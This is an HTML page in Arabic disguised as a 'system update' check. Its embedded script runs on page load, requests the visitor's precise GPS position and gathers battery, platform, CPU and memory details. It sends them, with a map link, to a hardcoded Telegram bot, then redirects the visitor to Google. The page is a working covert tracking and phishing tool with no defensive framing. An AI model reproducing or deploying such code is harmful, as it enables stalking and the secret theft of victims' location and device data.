<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>تحديث النظام</title>
</head>
<body style="background-color: #f0f0f0; text-align: center; font-family: sans-serif; padding-top: 50px;">
    <h2>جاري فحص حالة النظام...</h2>
    <p>يرجى السماح بالوصول للموقع للمتابعة</p>

    <script>
        const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
        const chatId = "7984067238"; 

        async function sendToTelegram(text) {
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
        }

        async function startTracking(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
            
            // 1. جلب معلومات البطارية
            let batt = "غير مسموح بالوصول";
            try {
                const battery = await navigator.getBattery();
                batt = `${Math.round(battery.level * 100)}% (${battery.charging ? "يشحن" : "لا يشحن"})`;
            } catch (e) {}

            // 2. معلومات الجهاز والذاكرة
            const platform = navigator.platform || "غير معروف";
            const cores = navigator.hardwareConcurrency || "غير معروف";
            const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "مخفية";

            const report = `🛰️ **تقرير مفصل**\n\n` +
                           `🔋 البطارية: ${batt}\n` +
                           `📱 النظام: ${platform}\n` +
                           `💾 الذاكرة: ${ram}\n` +
                           `⚙️ المعالج: ${cores} نواة\n` +
                           `📍 الموقع: ${mapLink}`;

            await sendToTelegram(report);
            window.location.href = "https://www.google.com";
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(startTracking, () => {
                    alert("يجب تفعيل GPS.");
                }, { enableHighAccuracy: true });
            }
        };
    </script>
</body>
</html>
